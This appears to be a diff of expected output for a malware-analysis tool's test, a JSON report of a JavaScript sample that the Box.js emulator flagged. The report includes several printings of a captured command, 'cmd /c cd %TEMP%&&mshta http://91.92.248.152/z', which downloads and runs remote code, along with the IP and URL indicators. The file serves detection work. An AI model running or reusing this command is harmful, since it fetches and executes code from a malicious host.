@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 541,
+    "score": 543,
     "sections": [
       {
         "auto_collapse": false,
@@ -18,7 +18,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)",
+        "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: WScript.Shell\n\t\tActiveXObject(WScript.Shell)",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -66,7 +66,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[12].Run(\"cmd /c cd %TEMP%&&mshta http://91.92.248.152/z\", 0)",
+        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tIOC: The script ran the command 'cmd /c cd %TEMP%&&mshta http://91.92.248.152/z'.\n\t\tWScript.Shell[12].Run(\"cmd /c cd %TEMP%&&mshta http://91.92.248.152/z\", 0)",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -110,6 +110,99 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: RunsShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "IOCs extracted by Box.js",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "cmd /c cd %TEMP%&&mshta http://91.92.248.152/z",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "cmd /c cd %TEMP%&&mshta http://91.92.248.152/z"
+              ]
+            }
+          }
+        },
+        "title_text": "The script ran the following commands",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "91.92.248.152",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://91.92.248.152/z",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/z",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "91.92.248.152"
+              ],
+              "uri": [
+                "http://91.92.248.152/z"
+              ],
+              "uri_path": [
+                "/z"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in command lines",
         "zeroize_on_tag_safe": false
       },
       {
@@ -232,7 +325,7 @@
   "files": {
     "extracted": [
       {
-        "name": "extracted_wscript.bat",
+        "name": "boxjs_cmds.bat",
         "sha256": "1c4d11614d87ae2436d5a316373a815860033c364bf15f6a14ae1b05207fcb95"
       }
     ],
@@ -240,6 +333,16 @@
   },
   "results": {
     "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
       {
         "attack_ids": [],
         "heur_id": 2,
@@ -284,6 +387,11 @@
     "tags": {
       "dynamic.process.command_line": [
         {
+          "heur_id": null,
+          "signatures": [],
+          "value": "cmd /c cd %TEMP%&&mshta http://91.92.248.152/z"
+        },
+        {
           "heur_id": 13,
           "signatures": [
             "wscript_cmd_url"
@@ -323,6 +431,11 @@
           "heur_id": 2,
           "signatures": [],
           "value": "91.92.248.152"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "91.92.248.152"
         }
       ],
       "network.static.uri": [
@@ -330,9 +443,19 @@
           "heur_id": 2,
           "signatures": [],
           "value": "http://91.92.248.152/z"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://91.92.248.152/z"
         }
       ],
       "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/z"
+        },
         {
           "heur_id": 2,
           "signatures": [],
